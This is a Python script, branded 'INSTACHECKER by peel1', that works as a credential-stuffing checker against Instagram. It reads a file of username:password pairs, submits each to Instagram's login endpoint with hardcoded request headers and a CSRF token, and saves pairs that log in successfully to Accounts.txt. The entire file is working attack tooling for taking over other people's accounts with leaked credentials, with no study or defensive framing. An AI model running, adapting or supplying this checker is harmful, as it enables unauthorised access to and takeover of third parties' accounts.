from typing import Any, Union

import requests
def Redline(Run):

    listname = input("name of user:pass list (must be in same directory as script) for example: usernameandpassword.txt")
    passlist = open(listname, "r", encoding="utf8")
    x = int(0)
    while Run == True:
        ltemp = passlist.readline()
        x = x + 1
        email = ltemp.partition(":")[0]
        passw = ltemp.partition(":")[2]
        passw = passw.rstrip()
        if email == "" and passw == "":
            print("End of File Reached. Exiting Program...")
            Run = False
        url = "https://www.instagram.com/accounts/login/ajax/"
        payload = 'username={}&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A0%3A{}&queryParams=%7B%7D&optIntoOneTap=false'.format(email, passw)
        headers = {
            'authority': 'www.instagram.com',
            'x-ig-www-claim': 'hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h',
            'x-instagram-ajax': '81a581bb9399',
            'content-type': 'application/x-www-form-urlencoded',
            'accept': '*/*',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
            'x-csrftoken': 'rn3aR7phKTodUHWdDfCGlERA7Gmhes8X',
            'x-ig-app-id': '936619743392459',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.instagram.com/',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cookie': ''
        }

        response = requests.request("POST", url, headers=headers, data=payload)

        response = response.text.encode('utf8')

        responseshrt = str(response[0:17])
        Fixed = str(b'{"user": true, "u')
        if responseshrt == Fixed:
            accounts = open("Accounts.txt", "w")
            accounts.write("{}:{}".format(email, passw))
            print("Line {} contains a valid credentials and has been written to Accounts.txt".format(x))
            accounts.close()
        else:
            print("Line {} doesn't contain valid credentials ".format(x))













print("""

 ██▓ ███▄    █   ██████ ▄▄▄█████▓ ▄▄▄       ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀▓█████  ██▀███  
▓██▒ ██ ▀█   █ ▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒██▒▓██  ▀█ ██▒░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▒██▀▀██░▒███   ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
░██░▓██▒  ▐▌██▒  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░██░▒██░   ▓██░▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░░▓█▒░██▓░▒████▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
░▓  ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░    ░      ▒   ▒▒ ░  ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ▒ ░   ░   ░ ░ ░  ░  ░    ░        ░   ▒   ░         ░  ░░ ░   ░   ░        ░ ░░ ░    ░     ░░   ░ 
 ░           ░       ░                 ░  ░░ ░       ░  ░  ░   ░  ░░ ░      ░  ░      ░  ░   ░     
                                           ░                       ░                               
----------------------------------------------by peel1---------------------------------------------
                                                                          
                                                                                                                                                                                                  
""")
Redline(True)



